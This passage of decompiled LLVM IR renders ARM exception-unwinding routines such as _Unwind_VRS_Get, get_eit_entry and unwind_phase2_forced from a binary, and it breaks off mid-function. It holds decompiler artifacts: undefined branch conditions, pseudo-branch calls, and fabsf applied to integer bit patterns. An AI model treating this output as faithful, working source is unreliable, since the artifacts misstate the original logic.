dec_label_pc_177ec:                               ; preds = %dec_label_pc_177e4, %dec_label_pc_177c8
  %v0_177ec = phi i32 [ %arg1, %dec_label_pc_177e4 ], [ %v0_177ec.pre, %dec_label_pc_177c8 ]
  %v3_177f0 = ashr i32 %v0_177ec, 31
  br label %dec_label_pc_177fc

dec_label_pc_177f8:                               ; preds = %dec_label_pc_177e4
  br label %dec_label_pc_177fc

dec_label_pc_177fc:                               ; preds = %dec_label_pc_177ec, %dec_label_pc_177f8
  %v1_17804 = phi i32 [ %v0_177ec, %dec_label_pc_177ec ], [ %tmp8, %dec_label_pc_177f8 ]
  %storemerge = phi i32 [ %v3_177f0, %dec_label_pc_177ec ], [ %tmp, %dec_label_pc_177f8 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  ret i32 %v1_17804

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 31, { 3, 1, 2, 4, 5, 0 }
  uselistorder i16 8, { 3, 0, 1, 2, 4 }
  uselistorder i16* @global_var_21510.336, { 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @__aeabi_read_tp, { 63, 69, 68, 62, 61, 78, 77, 66, 67, 65, 64, 76, 75, 74, 73, 72, 71, 70, 17, 25, 27, 34, 60, 43, 42, 12, 6, 5, 11, 24, 23, 10, 3, 2, 13, 9, 8, 7, 47, 16, 22, 46, 45, 26, 19, 21, 20, 57, 56, 14, 32, 31, 30, 33, 55, 54, 53, 29, 28, 18, 59, 58, 41, 38, 37, 36, 44, 4, 52, 51, 35, 50, 15, 49, 48, 0, 1, 40, 39 }
  uselistorder i32 -4095, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 34, 33, 35, 36, 37 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_177fc, { 1, 0 }
}

define i32 @_Unwind_VRS_Get(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_1780c = icmp eq i32 %regclass, 0
  br i1 %v2_1780c, label %dec_label_pc_17814, label %dec_label_pc_17844

dec_label_pc_17814:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_17814
  %v6_17818 = icmp eq i32 %representation, 0
  br i1 %v6_17818, label %dec_label_pc_17828, label %bb8

.thread3:                                         ; preds = %dec_label_pc_17814
  br label %dec_label_pc_17850

bb8:                                              ; preds = %bb
  br label %dec_label_pc_17850

dec_label_pc_17828:                               ; preds = %bb
  %v3_17828 = mul i32 %regno, 4
  %v2_1782c = add i32 %v3_17828, %context
  %v1_17830 = add i32 %v2_1782c, 4
  %v2_17830 = inttoptr i32 %v1_17830 to i32*
  %v3_17830 = load i32, i32* %v2_17830, align 4
  %v2_1783c = bitcast i8* %valuep to i32*
  store i32 %v3_17830, i32* %v2_1783c, align 4
  ret i32 0

dec_label_pc_17844:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_17844
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_17844, %bb9
  %v0_1784c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_1784c)
  br label %dec_label_pc_17850

dec_label_pc_17850:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_17850, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_VRS_Set(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_17858 = icmp eq i32 %regclass, 0
  br i1 %v2_17858, label %dec_label_pc_17860, label %dec_label_pc_17890

dec_label_pc_17860:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_17860
  %v6_17864 = icmp eq i32 %representation, 0
  br i1 %v6_17864, label %dec_label_pc_17874, label %bb8

.thread3:                                         ; preds = %dec_label_pc_17860
  br label %dec_label_pc_1789c

bb8:                                              ; preds = %bb
  br label %dec_label_pc_1789c

dec_label_pc_17874:                               ; preds = %bb
  %v3_17878 = mul i32 %regno, 4
  %v1_1787c = bitcast i8* %valuep to i32*
  %v2_1787c = load i32, i32* %v1_1787c, align 4
  %v2_17880 = add i32 %v3_17878, %context
  %v2_17888 = add i32 %v2_17880, 4
  %v3_17888 = inttoptr i32 %v2_17888 to i32*
  store i32 %v2_1787c, i32* %v3_17888, align 4
  ret i32 0

dec_label_pc_17890:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_17890
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_17890, %bb9
  %v0_17898 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_17898)
  br label %dec_label_pc_1789c

dec_label_pc_1789c:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_1789c, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_GetCFA(i32 %context) local_unnamed_addr {
entry:
  %v1_178a4 = add i32 %context, 68
  %v2_178a4 = inttoptr i32 %v1_178a4 to i32*
  %v3_178a4 = load i32, i32* %v2_178a4, align 4
  ret i32 %v3_178a4

; uselistorder directives
  uselistorder i32 68, { 10, 8, 0, 9, 1, 3, 4, 5, 6, 2, 7 }
}

define void @_Unwind_Complete(i32 %ucbp) local_unnamed_addr {
entry:
  ret void
}

define void @_Unwind_DeleteException(i32 %exc) local_unnamed_addr {
entry:
  %v1_178b4 = add i32 %exc, 8
  %v2_178b4 = inttoptr i32 %v1_178b4 to i32*
  %v3_178b4 = load i32, i32* %v2_178b4, align 4
  %v2_178b8 = icmp eq i32 %v3_178b4, 0
  br i1 %v2_178b8, label %.thread1, label %bb

bb:                                               ; preds = %entry
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v2_178cc = xor i1 %v2_178b8, true
  call void @__pseudo_cond_branch(i1 %v2_178cc, i32 %v3_178b4)
  ret void

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_Unwind_GetTextRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_178e4 = call i32 @abort()
  ret i32 %v0_178e4
}

; Function Attrs: noreturn
define i32 @_Unwind_GetDataRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_178f0 = call i32 @abort()
  ret i32 %v0_178f0
}

define i32 @get_eit_entry(i32 %ucbp, i32 %return_address) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_178f4 = load i32, i32* @r4, align 4
  store i32 %v3_178f4, i32* %stack_var_-32, align 4
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* %r5.global-to-local, align 4
  %v4_17904 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 132) to i32*), align 4
  %v2_17908 = icmp eq i32 %v4_17904, 0
  store i32 %ucbp, i32* %r6.global-to-local, align 4
  %v1_17914 = add i32 %return_address, -2
  store i32 %v1_17914, i32* %r4.global-to-local, align 4
  br i1 %v2_17908, label %dec_label_pc_1794c, label %dec_label_pc_1791c

dec_label_pc_1791c:                               ; preds = %entry
  call void @__pseudo_branch(i32 %v4_17904)
  %v2_1792c = icmp eq i32 %v1_17914, 0
  br i1 %v2_1792c, label %.thread, label %dec_label_pc_1796cthread-pre-split

.thread:                                          ; preds = %dec_label_pc_1791c
  store i32 9, i32* %r2.global-to-local, align 4
  %v2_17934 = load i32, i32* %r6.global-to-local, align 4
  %v3_17934 = add i32 %v2_17934, 16
  %v4_17934 = inttoptr i32 %v3_17934 to i32*
  store i32 0, i32* %v4_17934, align 4
  br label %dec_label_pc_1793c

dec_label_pc_1793c:                               ; preds = %.thread, %.thread10, %dec_label_pc_17ae4, %dec_label_pc_17ad0, %dec_label_pc_17aac, %dec_label_pc_17a84, %dec_label_pc_17984
  %v0_1793c = load i32, i32* %r2.global-to-local, align 4
  %v2_17944 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_17944, i32* @r4, align 4
  ret i32 %v0_1793c

dec_label_pc_1794c:                               ; preds = %entry
  store i32 20, i32* %r2.global-to-local, align 4
  %v4_17954 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 20) to i32*), align 4
  %v4_17958 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 48) to i32*), align 4
  store i32 %v4_17958, i32* %r2.global-to-local, align 4
  %v2_1795c = sub i32 %v4_17954, %v4_17958
  %v3_17960 = sdiv i32 %v2_1795c, 8
  store i32 %v3_17960, i32* %stack_var_-36, align 4
  br label %dec_label_pc_1796c

dec_label_pc_1796cthread-pre-split:               ; preds = %dec_label_pc_1791c
  %v3_1796c.pr = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_1796c

dec_label_pc_1796c:                               ; preds = %dec_label_pc_1796cthread-pre-split, %dec_label_pc_1794c
  %v0_179b0.pre = phi i32 [ %v1_17914, %dec_label_pc_1796cthread-pre-split ], [ %v4_17958, %dec_label_pc_1794c ]
  %v1_17974 = phi i32 [ %v3_1796c.pr, %dec_label_pc_1796cthread-pre-split ], [ %v3_17960, %dec_label_pc_1794c ]
  %v2_17970 = icmp eq i32 %v1_17974, 0
  br i1 %v2_17970, label %dec_label_pc_17984, label %dec_label_pc_179a0.preheader

dec_label_pc_179a0.preheader:                     ; preds = %dec_label_pc_1796c
  %v2_17974 = add i32 %v1_17974, -1
  %v1_179d0 = add i32 %v0_179b0.pre, 8
  br label %dec_label_pc_179a0.outer

dec_label_pc_17984.loopexit:                      ; preds = %dec_label_pc_179fc
  br label %dec_label_pc_17984

dec_label_pc_17984:                               ; preds = %dec_label_pc_17984.loopexit, %dec_label_pc_1796c, %dec_label_pc_17ac8
  store i32 9, i32* %r2.global-to-local, align 4
  %v1_1798c = load i32, i32* %r6.global-to-local, align 4
  %v2_1798c = add i32 %v1_1798c, 16
  %v3_1798c = inttoptr i32 %v2_1798c to i32*
  store i32 0, i32* %v3_1798c, align 4
  br label %dec_label_pc_1793c

dec_label_pc_17994:                               ; preds = %dec_label_pc_179f0
  %v3_17994 = icmp ult i32 %storemerge40, %v0_179f4
  br i1 %v3_17994, label %dec_label_pc_1799c, label %dec_label_pc_17a0c

dec_label_pc_1799c:                               ; preds = %dec_label_pc_17994
  %v1_1799c = add nsw i32 %v3_179a8, 1
  br label %dec_label_pc_179a0.outer

dec_label_pc_179a0.outer:                         ; preds = %dec_label_pc_1799c, %dec_label_pc_179a0.preheader
  %v1_179fc.ph = phi i32 [ %v1_1799c, %dec_label_pc_1799c ], [ 0, %dec_label_pc_179a0.preheader ]
  %v0_179a0.ph = phi i32 [ %v0_179a0, %dec_label_pc_1799c ], [ %v2_17974, %dec_label_pc_179a0.preheader ]
  br label %dec_label_pc_179a0

dec_label_pc_179a0:                               ; preds = %dec_label_pc_179a0.outer, %dec_label_pc_17a04
  %v0_179a0 = phi i32 [ %v1_17a04, %dec_label_pc_17a04 ], [ %v0_179a0.ph, %dec_label_pc_179a0.outer ]
  %v2_179a0 = add i32 %v0_179a0, %v1_179fc.ph
  %tmp = icmp slt i32 %v2_179a0, 0
  %v4_179a4 = zext i1 %tmp to i32
  %v5_179a4 = add i32 %v4_179a4, %v2_179a0
  %v3_179a8 = sdiv i32 %v5_179a4, 2
  %v3_179ac = mul i32 %v3_179a8, 8
  store i32 %v3_179ac, i32* @ip, align 4
  %v2_179b0 = add i32 %v3_179ac, %v0_179b0.pre
  %v3_179b0 = inttoptr i32 %v2_179b0 to i32*
  %v4_179b0 = load i32, i32* %v3_179b0, align 4
  %v1_179b4 = and i32 %v4_179b0, 1073741824
  %v2_179b4 = icmp eq i32 %v1_179b4, 0
  %v2_179b8 = or i32 %v4_179b0, -2147483648
  %tmp79 = bitcast i32 %v4_179b0 to float
  %tmp80 = call float @fabsf(float %tmp79)
  %v2_179bc = bitcast float %tmp80 to i32
  %storemerge = select i1 %v2_179b4, i32 %v2_179bc, i32 %v2_179b8
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v9_179c0 = icmp eq i32 %v2_17974, %v3_179a8
  store i32 %v2_179b0, i32* %r7.global-to-local, align 4
  br i1 %v9_179c0, label %dec_label_pc_179f0, label %dec_label_pc_179d0

dec_label_pc_179d0:                               ; preds = %dec_label_pc_179a0
  %v2_179d4 = add i32 %v3_179ac, %v1_179d0
  %v3_179d4 = inttoptr i32 %v2_179d4 to i32*
  %v4_179d4 = load i32, i32* %v3_179d4, align 4
  %v1_179dc = and i32 %v4_179d4, 1073741824
  %v2_179dc = icmp eq i32 %v1_179dc, 0
  %v2_179e0 = or i32 %v4_179d4, -2147483648
  %tmp81 = bitcast i32 %v4_179d4 to float
  %tmp82 = call float @fabsf(float %tmp81)
  %v2_179e4 = bitcast float %tmp82 to i32
  %storemerge39 = select i1 %v2_179dc, i32 %v2_179e4, i32 %v2_179e0
  %v1_179e8 = add i32 %v2_179d4, -1
  %v2_179ec = add i32 %storemerge39, %v1_179e8
  br label %dec_label_pc_179f0

dec_label_pc_179f0:                               ; preds = %dec_label_pc_179a0, %dec_label_pc_179d0
  %storemerge40 = phi i32 [ %v2_179ec, %dec_label_pc_179d0 ], [ -1, %dec_label_pc_179a0 ]
  %v2_179f0 = add i32 %storemerge, %v2_179b0
  %v0_179f4 = load i32, i32* %r4.global-to-local, align 4
  %v3_179f4 = icmp ult i32 %v0_179f4, %v2_179f0
  br i1 %v3_179f4, label %dec_label_pc_179fc, label %dec_label_pc_17994

dec_label_pc_179fc:                               ; preds = %dec_label_pc_179f0
  %v9_179fc = icmp eq i32 %v3_179a8, %v1_179fc.ph
  br i1 %v9_179fc, label %dec_label_pc_17984.loopexit, label %dec_label_pc_17a04

dec_label_pc_17a04:                               ; preds = %dec_label_pc_179fc
  %v1_17a04 = add nsw i32 %v3_179a8, -1
  br label %dec_label_pc_179a0

dec_label_pc_17a0c:                               ; preds = %dec_label_pc_17994
  %v2_17a0c = load i32, i32* %v3_179b0, align 4
  %v1_17a10 = and i32 %v2_17a0c, 1073741824
  %v2_17a10 = icmp eq i32 %v1_17a10, 0
  %v2_17a14 = or i32 %v2_17a0c, -2147483648
  %tmp83 = bitcast i32 %v2_17a0c to float
  %tmp84 = call float @fabsf(float %tmp83)
  %v2_17a18 = bitcast float %tmp84 to i32
  %v0_17a1c = select i1 %v2_17a10, i32 %v2_17a18, i32 %v2_17a14
  %v2_17a1c = add i32 %v0_17a1c, %v2_179b0
  %v1_17a20 = load i32, i32* %r6.global-to-local, align 4
  %v2_17a20 = add i32 %v1_17a20, 72
  %v3_17a20 = inttoptr i32 %v2_17a20 to i32*
  store i32 %v2_17a1c, i32* %v3_17a20, align 4
  %v0_17a24 = load i32, i32* %r7.global-to-local, align 4
  %v1_17a24 = add i32 %v0_17a24, 4
  %v2_17a24 = inttoptr i32 %v1_17a24 to i32*
  %v3_17a24 = load i32, i32* %v2_17a24, align 4
  %v7_17a28 = icmp eq i32 %v3_17a24, 1
  br i1 %v7_17a28, label %.thread10, label %dec_label_pc_17a3c

.thread10:                                        ; preds = %dec_label_pc_17a0c
  %v1_17a28 = add i32 %v3_17a24, -1
  store i32 5, i32* %r2.global-to-local, align 4
  %v2_17a34 = load i32, i32* %r6.global-to-local, align 4
  %v3_17a34 = add i32 %v2_17a34, 16
  %v4_17a34 = inttoptr i32 %v3_17a34 to i32*
  store i32 %v1_17a28, i32* %v4_17a34, align 4
  br label %dec_label_pc_1793c

dec_label_pc_17a3c:                               ; preds = %dec_label_pc_17a0c
  %v1_17a3c = icmp slt i32 %v3_17a24, 0
  br i1 %v1_17a3c, label %.thread38, label %dec_label_pc_17a54

.thread38:                                        ; preds = %dec_label_pc_17a3c
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_17a48 = load i32, i32* %r6.global-to-local, align 4
  %v5_17a48 = add i32 %v4_17a48, 76
  %v6_17a48 = inttoptr i32 %v5_17a48 to i32*
  store i32 %v1_17a24, i32* %v6_17a48, align 4
  %v3_17a4c = load i32, i32* %r2.global-to-local, align 4
  %v4_17a4c = load i32, i32* %r6.global-to-local, align 4
  %v5_17a4c = add i32 %v4_17a4c, 80
  %v6_17a4c = inttoptr i32 %v5_17a4c to i32*
  store i32 %v3_17a4c, i32* %v6_17a4c, align 4
  br label %dec_label_pc_17a74

dec_label_pc_17a54:                               ; preds = %dec_label_pc_17a3c
  %v1_17a54 = and i32 %v3_17a24, 1073741824
  %v2_17a54 = icmp eq i32 %v1_17a54, 0
  %v2_17a58 = or i32 %v3_17a24, -2147483648
  %tmp85 = bitcast i32 %v3_17a24 to float
  %tmp86 = call float @fabsf(float %tmp85)
  %v2_17a5c = bitcast float %tmp86 to i32
  %storemerge42 = select i1 %v2_17a54, i32 %v2_17a5c, i32 %v2_17a58
  %v1_17a60 = add i32 %storemerge42, 4
  %v2_17a64 = add i32 %v1_17a60, %v0_17a24
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_17a6c = load i32, i32* %r6.global-to-local, align 4
  %v2_17a6c = add i32 %v1_17a6c, 76
  %v3_17a6c = inttoptr i32 %v2_17a6c to i32*
  store i32 %v2_17a64, i32* %v3_17a6c, align 4
  %v0_17a70 = load i32, i32* %r2.global-to-local, align 4
  %v1_17a70 = load i32, i32* %r6.global-to-local, align 4
  %v2_17a70 = add i32 %v1_17a70, 80
  %v3_17a70 = inttoptr i32 %v2_17a70 to i32*
  store i32 %v0_17a70, i32* %v3_17a70, align 4
  br label %dec_label_pc_17a74

dec_label_pc_17a74:                               ; preds = %.thread38, %dec_label_pc_17a54
  %v0_17a74 = load i32, i32* %r6.global-to-local, align 4
  %v1_17a74 = add i32 %v0_17a74, 76
  %v2_17a74 = inttoptr i32 %v1_17a74 to i32*
  %v3_17a74 = load i32, i32* %v2_17a74, align 4
  store i32 %v3_17a74, i32* %r2.global-to-local, align 4
  %v1_17a78 = inttoptr i32 %v3_17a74 to i32*
  %v2_17a78 = load i32, i32* %v1_17a78, align 4
  %v1_17a7c = icmp slt i32 %v2_17a78, 0
  br i1 %v1_17a7c, label %dec_label_pc_17aa0, label %dec_label_pc_17a84

dec_label_pc_17a84:                               ; preds = %dec_label_pc_17a74
  %v1_17a84 = and i32 %v2_17a78, 1073741824
  %v2_17a84 = icmp eq i32 %v1_17a84, 0
  %v2_17a88 = or i32 %v2_17a78, -2147483648
  %tmp87 = bitcast i32 %v2_17a78 to float
  %tmp88 = call float @fabsf(float %tmp87)
  %v2_17a8c = bitcast float %tmp88 to i32
  %v0_17a90 = select i1 %v2_17a84, i32 %v2_17a8c, i32 %v2_17a88
  %v2_17a90 = add i32 %v0_17a90, %v3_17a74
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_17a98 = add i32 %v0_17a74, 16
  %v3_17a98 = inttoptr i32 %v2_17a98 to i32*
  store i32 %v2_17a90, i32* %v3_17a98, align 4
  br label %dec_label_pc_1793c

dec_label_pc_17aa0:                               ; preds = %dec_label_pc_17a74
  %v3_17aa0 = udiv i32 %v2_17a78, 16777216
  %v1_17aa4 = urem i32 %v3_17aa0, 16
  %v2_17aa4 = icmp eq i32 %v1_17aa4, 0
  br i1 %v2_17aa4, label %dec_label_pc_17aac, label %dec_label_pc_17ac0

dec_label_pc_17aac:                               ; preds = %dec_label_pc_17aa0
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_17ab4 = load i32, i32* %r5.global-to-local, align 4
  %v2_17ab4 = add i32 %v0_17ab4, -36856
  %v2_17ab8 = add i32 %v0_17a74, 16
  %v3_17ab8 = inttoptr i32 %v2_17ab8 to i32*
  store i32 %v2_17ab4, i32* %v3_17ab8, align 4
  br label %dec_label_pc_1793c

dec_label_pc_17ac0:                               ; preds = %dec_label_pc_17aa0
  %v7_17ac0 = icmp eq i32 %v1_17aa4, 1
  br i1 %v7_17ac0, label %dec_label_pc_17ae4, label %dec_label_pc_17ac8

dec_label_pc_17ac8:                               ; preds = %dec_label_pc_17ac0
  %v7_17ac8 = icmp eq i32 %v1_17aa4, 2
  br i1 %v7_17ac8, label %dec_label_pc_17ad0, label %dec_label_pc_17984

dec_label_pc_17ad0:                               ; preds = %dec_label_pc_17ac8
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_17ad8 = load i32, i32* %r5.global-to-local, align 4
  %v2_17ad8 = add i32 %v0_17ad8, -36872
  %v2_17adc = add i32 %v0_17a74, 16
  %v3_17adc = inttoptr i32 %v2_17adc to i32*
  store i32 %v2_17ad8, i32* %v3_17adc, align 4
  br label %dec_label_pc_1793c

dec_label_pc_17ae4:                               ; preds = %dec_label_pc_17ac0
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_17aec = load i32, i32* %r5.global-to-local, align 4
  %v2_17aec = add i32 %v0_17aec, -36864
  %v2_17af0 = add i32 %v0_17a74, 16
  %v3_17af0 = inttoptr i32 %v2_17af0 to i32*
  store i32 %v2_17aec, i32* %v3_17af0, align 4
  br label %dec_label_pc_1793c

; uselistorder directives
  uselistorder i32 %v1_17aa4, { 2, 1, 0 }
  uselistorder i32 %v0_17a74, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_17a24, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_179f4, { 1, 0 }
  uselistorder i32 %v3_179ac, { 2, 1, 0 }
  uselistorder i32 %v3_179a8, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_179a0, { 1, 0 }
  uselistorder i32 %v0_179a0, { 1, 0 }
  uselistorder i32 %v2_17974, { 1, 0 }
  uselistorder i32 %v0_179b0.pre, { 1, 0 }
  uselistorder i32 %v3_17960, { 1, 0 }
  uselistorder i32 %v1_17914, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 15, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 14, 13 }
  uselistorder i32 132, { 0, 3, 4, 5, 6, 1, 2 }
  uselistorder label %dec_label_pc_17a74, { 1, 0 }
  uselistorder label %dec_label_pc_179f0, { 1, 0 }
  uselistorder label %dec_label_pc_179a0, { 1, 0 }
  uselistorder label %dec_label_pc_17984, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1793c, { 2, 3, 4, 5, 1, 6, 0 }
}

define i32 @function_17afc(i32 %arg1) local_unnamed_addr {
dec_label_pc_17afc:
  %v0_17afc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17afc, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_17afc
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_17afc, %bb
  %v10_17b04 = phi i32 [ %arg1, %dec_label_pc_17afc ], [ 0, %bb ]
  ret i32 %v10_17b04

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @unwind_phase2_forced(i32 %ucbp, i32 %entry_vrs, i32 %resuming) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %next_vrs_-648 = alloca i32, align 4
  %saved_vrs_-344 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %v1_17b18 = add i32 %entry_vrs, 4
  store i32 %ucbp, i32* @r5, align 4
  store i32 %resuming, i32* @r6, align 4
  %v1_17b2c = inttoptr i32 %v1_17b18 to i32*
  %v2_17b2c = load i32, i32* %v1_17b2c, align 4
  store i32 %v2_17b2c, i32* %r0.global-to-local, align 4
  %v12_17b2c = add i32 %entry_vrs, 20
  %v1_17b38 = inttoptr i32 %v12_17b2c to i32*
  %v2_17b38 = load i32, i32* %v1_17b38, align 4
  store i32 %v2_17b38, i32* %r0.global-to-local, align 4
  %v12_17b38 = add i32 %entry_vrs, 36
  %v1_17b40 = inttoptr i32 %v12_17b38 to i32*
  %v2_17b40 = load i32, i32* %v1_17b40, align 4
  store i32 %v2_17b40, i32* %r0.global-to-local, align 4
  %v12_17b40 = add i32 %entry_vrs, 52
  store i32 %v12_17b40, i32* @ip, align 4
  %v13_17b44 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v13_17b44, i32* @lr, align 4
  %v1_17b48 = inttoptr i32 %v12_17b40 to i32*
  %v2_17b48 = load i32, i32* %v1_17b48, align 4
  store i32 %v2_17b48, i32* %r0.global-to-local, align 4
  %v9_17b48 = add i32 %entry_vrs, 64
  %v10_17b48 = inttoptr i32 %v9_17b48 to i32*
  %v11_17b48 = load i32, i32* %v10_17b48, align 4
  store i32 0, i32* @r4, align 4
  %v1_17b50 = add i32 %ucbp, 12
  %v2_17b50 = inttoptr i32 %v1_17b50 to i32*
  %v3_17b50 = load i32, i32* %v2_17b50, align 4
  store i32 %v2_17b48, i32* %stack_var_-292, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 0, i32* %saved_vrs_-344, align 4
  %v2_17b68 = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_17b48)
  store i32 %v2_17b68, i32* %r0.global-to-local, align 4
  %v0_17b6c = load i32, i32* @r6, align 4
  %v1_17b6c = load i32, i32* @r4, align 4
  %v9_17b6c = icmp eq i32 %v0_17b6c, %v1_17b6c
  store i32 %v2_17b68, i32* @r7, align 4
  %.pre = ptrtoint i32* %saved_vrs_-344 to i32
  br i1 %v9_17b6c, label %dec_label_pc_17b80, label %.thread

.thread:                                          ; preds = %entry
  br label %dec_label_pc_17b8c

dec_label_pc_17b80:                               ; preds = %entry
  store i32 %v0_17b6c, i32* @r4, align 4
  br label %dec_label_pc_17b88

dec_label_pc_17b88:                               ; preds = %dec_label_pc_17c50, %dec_label_pc_17b80
  br label %dec_label_pc_17b8c

dec_label_pc_17b8c:                               ; preds = %.thread, %dec_label_pc_17b88
  %storemerge = phi i32 [ 10, %.thread ], [ 9, %dec_label_pc_17b88 ]
  store i32 %storemerge, i32* @r6, align 4
  %v2_17b8c = icmp eq i32 %v2_17b68, 0
  br i1 %v2_17b8c, label %dec_label_pc_17c04, label %.thread2.dec_label_pc_17ba0_crit_edge

.thread2.dec_label_pc_17ba0_crit_edge:            ; preds = %dec_label_pc_17b8c
  br label %dec_label_pc_17ba0

dec_label_pc_17ba0:                               ; preds = %.thread2.dec_label_pc_17ba0_crit_edge, %dec_label_pc_17c04
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_17bb0 = load i32, i32* @r5, align 4
  store i32 %v0_17bb0, i32* @r3, align 4
  store i32 97216, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_17b50)
  br i1 false, label %dec_label_pc_17bc8, label %dec_label_pc_17bf0

dec_label_pc_17bc8:                               ; preds = %dec_label_pc_17ba0
  br i1 undef, label %dec_label_pc_17bd0, label %dec_label_pc_17bf4

dec_label_pc_17bd0:                               ; preds = %dec_label_pc_17bc8
  br i1 undef, label %dec_label_pc_17c50, label %dec_label_pc_17be8

dec_label_pc_17be8:                               ; preds = %dec_label_pc_17bd0
  br i1 undef, label %dec_label_pc_17c48, label %dec_label_pc_17bf0

dec_label_pc_17bf0:                               ; preds = %dec_label_pc_17ba0, %dec_label_pc_17be8
  br label %dec_label_pc_17bf4

dec_label_pc_17bf4:                               ; preds = %dec_label_pc_17bc8, %dec_label_pc_17bf0
  store i32 9, i32* %r0.global-to-local, align 4
  ret i32 9

dec_label_pc_17c04:                               ; preds = %dec_label_pc_17b8c
  store i32 %v11_17b48, i32* @r3, align 4
  %v2_17c08 = ptrtoint i32* %next_vrs_-648 to i32
  store i32 %v2_17c08, i32* @r4, align 4
  %v1_17c0c = load i32, i32* @r5, align 4
  %v2_17c0c = add i32 %v1_17c0c, 20
  %v3_17c0c = inttoptr i32 %v2_17c0c to i32*
  store i32 %v11_17b48, i32* %v3_17c0c, align 4
  store i32 %v2_17c08, i32* @r0, align 4
  store i32 %.pre, i32* @r1, align 4
  store i32 304, i32* @r2, align 4
  %v0_17c1c = call i32 @memcpy()
  %v0_17c24 = load i32, i32* @r6, align 4
  store i32 %v0_17c24, i32* %r0.global-to-local, align 4
  %v0_17c28 = load i32, i32* @r5, align 4
  %v1_17c2c = add i32 %v0_17c28, 16
  %v2_17c2c = inttoptr i32 %v1_17c2c to i32*
  %v3_17c2c = load i32, i32* %v2_17c2c, align 4
  store i32 %v3_17c2c, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v3_17c2c)
  %v0_17c3c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17c3c, i32* @r4, align 4
  br label %dec_label_pc_17ba0

dec_label_pc_17c48:                               ; preds = %dec_label_pc_17be8
  br label %dec_label_pc_17c50

